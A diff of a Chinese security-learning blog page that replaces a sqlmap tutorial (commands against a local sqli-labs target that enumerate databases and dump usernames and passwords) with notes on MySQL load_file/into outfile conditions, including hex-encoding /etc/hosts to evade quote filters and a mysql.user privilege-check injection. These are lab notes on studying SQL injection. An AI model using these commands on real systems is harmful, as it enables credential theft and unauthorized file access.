@@ -20,27 +20,27 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="1.load_file的文件大小必须小于max_allowed_packet2.文件具有可执行权限：chmod a+x 文件路径&#x2F;文件名(有时候没法读取，可以先把内容out file出来，然后下载，但测试只能在数据库中执行)">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sqlmap">
-<meta property="og:url" content="http://example.com/2021/10/31/sqlmap/index.html">
+<meta property="og:title" content="load_file">
+<meta property="og:url" content="http://example.com/2021/12/01/load-file/index.html">
 <meta property="og:site_name" content="whhzt的博客">
+<meta property="og:description" content="1.load_file的文件大小必须小于max_allowed_packet2.文件具有可执行权限：chmod a+x 文件路径&#x2F;文件名(有时候没法读取，可以先把内容out file出来，然后下载，但测试只能在数据库中执行)">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://s3.bmp.ovh/imgs/2021/10/3694ac142e813ffd.jpg">
-<meta property="article:published_time" content="2021-10-31T15:38:38.000Z">
-<meta property="article:modified_time" content="2021-10-31T15:43:51.583Z">
+<meta property="article:published_time" content="2021-12-01T12:02:56.000Z">
+<meta property="article:modified_time" content="2021-12-01T12:06:44.848Z">
 <meta property="article:author" content="我的博客">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s3.bmp.ovh/imgs/2021/10/3694ac142e813ffd.jpg">
 
 
-<link rel="canonical" href="http://example.com/2021/10/31/sqlmap/">
+<link rel="canonical" href="http://example.com/2021/12/01/load-file/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/10/31/sqlmap/","path":"2021/10/31/sqlmap/","title":"sqlmap"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/12/01/load-file/","path":"2021/12/01/load-file/","title":"load_file"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>sqlmap | whhzt的博客</title>
+<title>load_file | whhzt的博客</title>
   
 
 
@@ -108,7 +108,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">1.对url进行检测，判断是否存在SQL注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">2.获取数据库</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">3 获取数据库中的表</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">4.</span> <span class="nav-text">4.获取表中的列</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">5.</span> <span class="nav-text">5.获取列中的数据</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">1.</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">2.</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">3.</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">4.</span> <span class="nav-text">4.</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">5.</span> <span class="nav-text">5.</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -165,7 +165,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/31/sqlmap/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/01/load-file/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -178,7 +178,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          sqlmap
+          load_file
         </h1>
 
         <div class="post-meta-container">
@@ -190,7 +190,7 @@
       <span class="post-meta-item-text">Posted on</span>
       
 
-      <time title="Created: 2021-10-31 23:38:38 / Modified: 23:43:51" itemprop="dateCreated datePublished" datetime="2021-10-31T23:38:38+08:00">2021-10-31</time>
+      <time title="Created: 2021-12-01 20:02:56 / Modified: 20:06:44" itemprop="dateCreated datePublished" datetime="2021-12-01T20:02:56+08:00">2021-12-01</time>
     </span>
 
   
@@ -203,25 +203,26 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <p><img src="https://s3.bmp.ovh/imgs/2021/10/3694ac142e813ffd.jpg" alt="这是一张图片"></p>
+        <p>1.load_file的文件大小必须小于max_allowed_packet<br>2.文件具有可执行权限：chmod a+x 文件路径/文件名<br>(有时候没法读取，可以先把内容out file出来，然后下载，但测试只能在数据库中执行)</p>
 <span id="more"></span>
 <hr>
-<h1>1.对url进行检测，判断是否存在SQL注入</h1>
-sqlmap.py -u “url” --batch // --batch 永远不要要求用户输入，使用默认行为 url必须叫""引起来 <br>
-sqlmap.py -u "http://127.0.0.1/sqli-labs-master/Less-1/?id=5" -batch <br>
-<h1>2.获取数据库</h1>
- sqlmap.py -u url --dbs --batch    获取全部数据库 <br>
-sqlmap.py -u url --current-dbs --batch  获取当前数据库 <br>
-sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=5 --dbs --batch <br>
-<h1>3 获取数据库中的表</h1>
-sqlmap.py -u url -D DB --tables --batch <br>
-sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=5 -D security --tables --batch <br>
-<h1>4.获取表中的列</h1>
-sqlmap.py -u url -D DB -T TBL --columns --batch <br>
- sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=5 -D security -T users --columns --batch <br>
-<h1>5.获取列中的数据</h1>
-sqlmap.py -u url -D DB -T TBL -C COL --dump --batch  // --dump 获取列中的内容 <br>
-sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=5 -D security -T users -C "username,password" --dump --batch 
+<p>使用into oufile 的五个条件</p>
+<h1>1.</h1>要有secure_file_priv参数
+这个参数用来限制数据导入和导出操作的效果，例如执行load data、select … into outfile语句和load_file()函数。这些操作需要用户具有FILE权限
+当secure_file_priv为NULL，表示对MySQL限制进行导入与导出
+当secure_file_priv的值为/tmp/ ，表示限制MySQL的导入与导出只能发生在/tmp/目录下
+当secure_file_priv没有指定具体值时，则不对导入与导出进行任何限制
+<h1>2.</h1>要知道绝对路径，这样into outfile ‘文件路径/文件名’ 才能写在正确的目录下
+<h1>3.</h1>目标没有对单引号(’)进行过滤
+outfile后的文件路径不能用十六进制或配合char()来实现，只能用引号这种形式
+因为包含路径的引号不能用其他函数代替
+如果被过滤，可以使用hex编码进行逃逸
+注：PHP中hex编码后可以直接加进去。如：load_file(/etc/hosts) 可以直接 load_file(0x2f6574632f686f737473)
+<h1>4.</h1>能够使用union,需要MySQL1.3以上版本
+<h1>5.</h1>对WEB的目录具有读权限
+判断是否具有读权限
+and (select count(*) from mysql.user)>0 ##如果结果返回正常，说明具有读写权限
+and (select count(*) from mysql.user)>0 ##返回错误，应该是管理员给数据库账户降权了
 
     </div>
 
@@ -252,14 +253,11 @@ sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=5 -D security -T users
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2021/10/25/sqli-labs%205-6/" rel="prev" title="5-6">
-                  <i class="fa fa-chevron-left"></i> 5-6
+                <a href="/2021/10/31/sqlmap/" rel="prev" title="sqlmap">
+                  <i class="fa fa-chevron-left"></i> sqlmap
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2021/12/01/load-file/" rel="next" title="load_file">
-                  load_file <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
